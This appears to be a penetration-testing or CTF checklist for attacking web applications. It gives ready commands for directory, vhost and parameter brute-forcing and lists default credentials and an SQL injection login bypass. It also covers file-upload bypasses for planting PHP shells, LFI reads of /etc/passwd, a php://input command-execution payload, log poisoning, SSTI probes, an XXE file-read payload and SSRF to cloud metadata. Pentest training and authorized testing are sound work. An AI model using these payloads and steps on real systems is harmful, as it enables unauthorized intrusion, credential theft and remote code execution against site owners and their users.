# Web App Checklist

## 1. Enumerate
```bash
# Tech fingerprint
whatweb http://<IP>
curl -I http://<IP>

# Dir/file brute
feroxbuster -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,zip
gobuster dir -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,html

# Vhost brute
gobuster vhost -u http://<IP> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://<IP> -H "Host: FUZZ.<domain>"

# Parameters
arjun -u http://<IP>/page.php
```

## 2. CMS detected?
```bash
wpscan --url http://<IP> -e ap,u   # WordPress
droopescan scan drupal -u http://<IP>  # Drupal
# Check version → searchsploit <cms> <version>
```

## 3. Login page
- Try default creds: admin/admin, admin/password, admin/<domain>
- Try SQLi: `' OR 1=1-- -`
- Check response size differences (valid vs invalid user → user enum)
- Brute with hydra if lockout not present

## 4. File upload
- Try: .php, .php5, .phtml, .phar
- Try double extension: shell.php.jpg
- Try Content-Type bypass: change to image/jpeg with .php file
- Try null byte: shell.php%00.jpg (old PHP)
- Upload .htaccess to allow execution of custom extension

## 5. LFI found
```bash
# Basic
/etc/passwd
/etc/hosts
/proc/self/environ

# Log poisoning → RCE
# PHP wrappers
php://filter/convert.base64-encode/resource=/etc/passwd
php://input   # POST <?php system($_GET['cmd']); ?>

# LFI → RCE via /proc/self/fd, session files, mail log
# Check: /var/log/apache2/access.log (inject PHP in User-Agent)
```

## 6. SSTI (template injection)
```
{{7*7}}   → 49 = Jinja2/Twig
${7*7}    → 49 = Freemarker
<%= 7*7 %> → ERB
```
→ use tplmap or manual payload for RCE

## 7. XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

## 8. SSRF
- Replace URLs in parameters with http://127.0.0.1/
- Try internal ranges: 169.254.169.254 (AWS meta), 10.x, 172.16.x
- Try file:// protocol

## 9. Got shell?
→ Go to Linux Box or Windows Box checklist
